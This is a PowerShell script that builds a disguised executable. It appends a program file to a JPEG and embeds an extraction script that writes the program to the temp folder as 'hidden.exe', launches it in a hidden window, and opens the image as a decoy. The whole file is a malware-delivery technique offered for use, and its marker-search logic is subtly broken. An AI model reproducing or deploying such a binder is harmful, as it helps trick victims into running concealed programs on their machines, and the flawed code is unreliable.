# Prepare the files
$imagePath = "original.jpg"
$exePath = "program.exe"
$outputPath = "hidden_image.jpg"

# Combine files
[System.IO.File]::WriteAllBytes($outputPath, 
    [System.IO.File]::ReadAllBytes($imagePath) + 
    [System.IO.File]::ReadAllBytes($exePath))

# Create the extraction script
$scriptContent = @'
[System.Reflection.Assembly]::LoadWithPartialName('System.Drawing') | Out-Null

# Extract the EXE portion
$allBytes = [System.IO.File]::ReadAllBytes($MyInvocation.MyCommand.Path)
$jpgMarker = [System.Text.Encoding]::ASCII.GetBytes("ÿØÿà")

# Find where EXE begins
for($i=0; $i -lt $allBytes.Length-4; $i++) {
    if ($allBytes[$i] -eq 0xFF -and $allBytes[$i+1] -eq 0xD8 -and $allBytes[$i+2] -eq 0xFF -and $allBytes[$i+3] -eq 0xE0) {
        $exeStart = $i
        break
    }
}

if ($exeStart -gt 0) {
    $exeBytes = $allBytes[$exeStart..($allBytes.Length-1)]
    $tempExe = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "hidden.exe")
    [System.IO.File]::WriteAllBytes($tempExe, $exeBytes)
    Start-Process -FilePath $tempExe -WindowStyle Hidden
}

# Display the image
$memStream = New-Object System.IO.MemoryStream(,$allBytes[0..($exeStart-1)])
$image = [System.Drawing.Image]::FromStream($memStream)
$image.Save("display_temp.jpg")
Start-Process "display_temp.jpg"
'@

# Combine everything
[System.IO.File]::WriteAllBytes("final_image.jpg", 
    [System.IO.File]::ReadAllBytes($imagePath) + 
    [System.Text.Encoding]::ASCII.GetBytes("ÿØÿà") + 
    [System.IO.File]::ReadAllBytes($exePath) + 
    [System.Text.Encoding]::UTF8.GetBytes($scriptContent))